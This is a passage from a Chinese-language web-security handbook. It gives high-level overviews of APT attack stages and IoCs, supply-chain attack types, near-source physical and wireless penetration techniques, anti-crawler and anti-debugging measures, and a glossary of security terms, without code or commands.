- 网络钓鱼：攻击者通常会结合社会工程学等手段来伪造可信度非常高的电子邮件
- 伪造合法签名来逃避杀毒软件检测（以震网病毒为例，其在攻击时就使用了白加黑的模式）
- 水坑攻击：入侵攻击目标经常访问的网站，并植入恶意代码
- 零日漏洞：据统计APT28仅2015年一年当中就在攻击中就至少使用了六个零日漏洞

#### 12.10.3. 持续性（Persistent）

APT攻击的过程通常包括多个实施阶段，整个攻击过程一般持续时间会达到几个月甚至数年：

- **侦查阶段**: 收集目标信息
- **初次入侵阶段**: 利用已知漏洞或零日漏洞获取初步控制权限
- **权限提升阶段**: 使用权限提升漏洞或爆破密码获取更高权限
- **保持访问阶段**: 窃取凭证，使用RAT建立连接，植入后门
- **横向扩展阶段**: 在内网缓慢且隐蔽地扩散
- **攻击收益阶段**: 窃取信息或造成破坏

#### 12.10.4. 威胁性（Threat）

APT的目标多是政府机构、金融、能源等敏感企业、部门，一旦这些目标被成功攻击，其影响往往十分巨大。

#### 12.10.5. 相关事件
- 2010年伊朗震网病毒
- 2013美国棱镜门事件

#### 12.10.6. IoC

IoC (Indicators of Compromise) 在取证领域被定义为计算机安全性被破坏的证据。

常见的 IoC 有：hash、IP、域名、网络、主机特征、工具、TTPs

#### 12.10.7. 参考链接
- [APT 分析及 TTPs 提取](https://projectsharp.org/2020/02/23/APT分析及TTPs提取)

---

## [供应链安全](https://websec.readthedocs.io/zh/latest/misc/supplychain.html)

### 12.11. 供应链安全

#### 12.11.1. 简介

供应链安全是指确保软件开发和交付过程中的所有环节都是安全的，以防止恶意攻击者在软件开发和交付过程中植入恶意代码或漏洞，从而保护最终用户的安全和隐私。

#### 12.11.2. 供应链安全问题

- **供应链失陷**: 恶意攻击者通过攻击供应商进入用户的计算机系统或网络
- **供应链后门**: 供应商提供的系统存在预置的后门、默认口令或者预留的调试接口
- **供应链漏洞**: 供应链软件中存在的安全漏洞
- **供应链污染**: 恶意攻击者将恶意代码或漏洞植入到软件中
- **供应链数据安全**: 隐私、敏感数据在供应链中泄露的情况

#### 12.11.3. 常见攻击方式

- **创建名称类似的软件包** - Combosquatting、Typosquatting、修改词序、修改分割符
- **注入依赖** - 命名为内部包
- **影响构建** - 利用 CI/CD 漏洞
- **提交后门代码** - 劫持开发者账号、提交逻辑隐蔽的后门、利用渲染问题隐藏提交逻辑（Homoglyph、Unicode Bidirectional、其它控制字符、混淆/minified）

#### 12.11.4. 参考链接
- [Introducing SLSA, an End-to-End Framework for Supply Chain Integrity](https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html)

---

## [近源渗透](https://websec.readthedocs.io/zh/latest/misc/nearsource.html)

### 12.12. 近源渗透

#### 12.12.1. USB攻击

##### BadUSB

通过重新编程USB设备的内部微控制器，来执行恶意操作，例如注册为键盘设备，发送特定按键进行恶意操作。

##### AutoRUN

根据主机配置的方式，一些操作系统会自动执行位于USB设备存储器上的预定文件。可以通过这种方式执行恶意软件。

##### USB Killer

通过特殊的USB设备基于电气等方式来永久销毁设备。

##### 侧信道

通过改装USB增加一些监听/测信道传输设备。

##### HID攻击

HID(human interface device)指键盘、鼠标等用于为计算机提供数据输入的人机交互设备。HID攻击指攻击者将特殊的USB设备模拟成为键盘，一旦连接上计算机就执行预定的恶意操作。

#### 12.12.2. Wi-Fi

##### 密码爆破

基于WPA2的验证方式，Wi-Fi可以通过抓握手包的方式进行线下的密码爆破。

##### 信号压制

可以使用大功率的设备捕获握手包并模仿目标AP，从而实现中间人攻击。

#### 12.12.3. 门禁

##### 电磁脉冲

部分电子门禁和电子密码锁的电子系统中集成电路对电磁脉冲比较敏感，可以通过外加电磁脉冲(EMP)的方式破坏设备。

##### IC卡

基于变色龙等设备可以使用模拟、破解、复制IC卡破解门禁。

#### 12.12.4. 参考链接

- [近源渗透硬件指北](https://www.secpulse.com/archives/123723.html)
- [红蓝对抗之近源渗透](https://mp.weixin.qq.com/s/dmh3dDt0BaZYIcWdSTsQcg)

---

## [爬虫](https://websec.readthedocs.io/zh/latest/misc/spider.html)

### 12.13. 爬虫

#### 12.13.1. 反爬虫机制

- 检测 User-Agent
- 数据加密
- 接口签名
- 聚类风控
- 浏览器指纹检测（硬件特性、`window.navigator.plugins`、`window.screen`等）
- canvas 指纹检测

#### 12.13.2. 前端反调试

- hook 按键事件，禁止 F12 / 右键
  - document.oncontextmenu
  - document.onkeydown
  - document.onkeyup
  - document.onkeypress
- 循环 debugger
- 检测控制台打开后主动触发 OOM

---

## [常见术语](https://websec.readthedocs.io/zh/latest/misc/terminology.html)

### 12.14. 常见术语

#### 12.14.1. Windows

- WMI (Windows Management Instrumentation)
- ETW (Event Tracing for Windows)
- WFP (Windows Filtering Platform)
- MS-RPC (Microsoft Remote Procedure Call)
- MS-SAMR (Security Account Manager Remote Protocol)
- MS-SCMR (Service Control Manager Remote Protocol)
- MS-DRSR (Directory Replication Service Remote Protocol)
- MS-TSCH (Task Scheduler Service Remoting Protocol)
- DCOM (Distributed Component Object Model)

#### 12.14.2. 网络相关

##### 网络协议

- LDAP (Lightweight Directory Access Protocol) 轻型目录访问协议
- DN (Distinguished Name) 标识名
- RDN (Relative Distinguished Name) 相对标识名
- SMB (Server Message Block) 服务器消息块
- CIFS (Common Internet File System) 网络文件共享系统
- SMTP (Simple Mail Transfer Protocol)
- SNMP (Simple Network Management Protocol) 简单网络管理协议
- POP3 (Post Office Protocol 3)
- IMAP (Internet Mail Access Protocol)
- HTTP (HyperText Transfer Protocol)
- HTTPS (HTTP over Secure Socket Layer)
- DHCP (Dynamic Host Configuration Protocol) 动态主机配置协议
- RPC (Remote Procedure Call) 远程过程调用
- JDWP (Java Debug Wire Protocol) Java调试线协议
- NFS (Network File System) 网络文件系统
- SPN (Service Principal Names) 服务主体名称
- SASL (Simple Authentication and Security Layer) 简单身份验证
- LLMNR (Link-Local Multicast Name Resolution) 链路本地多播名称解析
- DCE/RPC (Distributed Computing Environment / Remote Procedure Calls)

##### 路由系统

- AS (Autonomous System) 自治系统
- IGP (Interior Gateway Protocol) 内部网关协议
- EGP (External Gateway Protocol) 外部网关协议
- 网络地址转换 (NAT)
- QUIC (Quick UDP Internet Connections)

##### Kerberos
- 密钥分发中心
- 认证服务器
- 票据授权服务器

#### 12.14.3. 开发相关

- REST (Representation State Transformation)

#### 12.14.4. 安全相关

- **缺点** (defect / mistake) 软件在实现上和设计上的弱点
- **缺陷** 实现层面的软件缺点，容易被发现和修复，例如缓冲区溢出
- **瑕疵** 一种设计上的缺点，难以察觉
- **漏洞** 可以用于违反安全策略的缺陷或瑕疵
- ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)
- 横向移动
- 入侵和攻击模拟

##### 安全开发
- 安全信息和事件管理 (SIEM)
- SOAR (Security Orchestration, Automation and Response) 自动化响应
- SDL (Security Development Lifecycle)

##### 安全策略
- CORS (Cross-Origin Resource Sharing) 跨域资源共享策略
- SPF (Sender Policy Framework) 发件人策略框架
- DKIM (DomainKeys Identified Mail) 域名密钥识别邮件
- DMARC (Domain-based Message Authentication, Reporting and Conformance) 基于域名的消息认证报告与一致性协议
- DNSSEC (The Domain Name System Security Extensions)
- DNS-based Authentication of Named Entities (DANE)

##### 安全模型
- BSIMM (Building Security In Maturity Model)

#### 12.14.5. 攻击相关

##### 漏洞类型
- XSS (Cross-Site Scripting) 跨站脚本攻击
- CSRF (Cross-Site Request Forgery) 跨站请求伪造
- MITM (Man-in-the-Middle) 中间人攻击
- SSRF (Server-Side Request Forgery) 服务端请求伪造
- APT (Advanced Persistent Threat) 高级持续威胁
- RCE (Remote Code Execution) 远程代码执行
- OOB (Out-of-Band) 带外数据

##### 攻击方式
- 鱼叉攻击 (Spear Phishing)
- 水坑攻击 (Watering Hole)
- DDoS (Distributed Denial of Service) 分布式拒绝服务

#### 12.14.6. 防御相关

- IoC (Indicators of Compromise)
- IoA (Indicators of Activity)

##### 防御技术
- NDR (Network Detection and Response) 网络检测响应
- EDR (Endpoint Detection and Response) 终端检测响应
- MDR (Managed Detection and Response) 托管检测响应
- XDR (Extended Detection and Response) 扩展检测响应
- ASA (Adaptive Security Architecture) 自适应安全架构
- ZTNA (Zero Trust Network Access) 零信任网络访问
- CSPM (Cloud Security Posture Management) 云安全配置管理

##### 防护设施
- IDS (Intrusion Detection System) 入侵检测系统
- HIDS (Host-based Intrusion Detection System) 主机型入侵检测系统
- HIPS (Host Intrusion Prevention System) 主机入侵防御系统
- RASP (Runtime Application Self-protection) 运行时应用自我防护
- UEM (Unified Endpoint Management) 统一端点管理

#### 12.14.7. 运维

- AIOps (Artificial Intelligence for IT Operations) 智能运维
- RVA (Risk and Vulnerability Assessment) 风险和脆弱性评估
- CERT (Computer Emergency Response Team) 计算机安全应急响应组

#### 12.14.8. 认证

- SSO (Single Sign-On) 单点登录
- 2FA (Two-Factor Authentication) 双因素认证
- MFA (Multi-Factor Authentication) 多因素认证
- OTP (One-Time Password) 一次性密码

##### Kerberos
- 认证服务器 (Authentication Server)
- 密钥分发中心 (Key Distribution Center, KDC)
- TGT (Ticket Granting Ticket) 票据授权票据
- TGS (Ticket Granting Server) 票据授权服务器

#### 12.14.9. 可信计算

- TPM (Trusted Platform Module) 可信平台模块

#### 12.14.10. 云

##### 容器
- Container Runtime 容器运行时
- OCI (Open Container Initiative) 开放容器标准
- OCF (Open Container Format) 开放容器格式标准

##### 计算
- EC2 (Elastic Compute Cloud) 弹性云计算
- 云服务器

##### 存储
- S3 (Simple Storage Service) 简单存储服务
- 对象存储

##### XaaS
- FaaS (Function as a Service) 函数即服务
- CaaS (Container as a Service) 容器即服务
- SaaS (Software as a Service) 软件即服务
- PaaS (Platform as a Service) 平台即服务
- IaaS (Infrastructure as a Service) 基础设施即服务

##### 特定平台
- OCI (Oracle Cloud Infrastructure)

##### 其他服务
- 元数据服务 (Metadata Service)
- CI/CD (Continuous Integration/Continuous Delivery) 持续集成/持续交付
- ECM (Edge Computing Machine) 边缘计算机器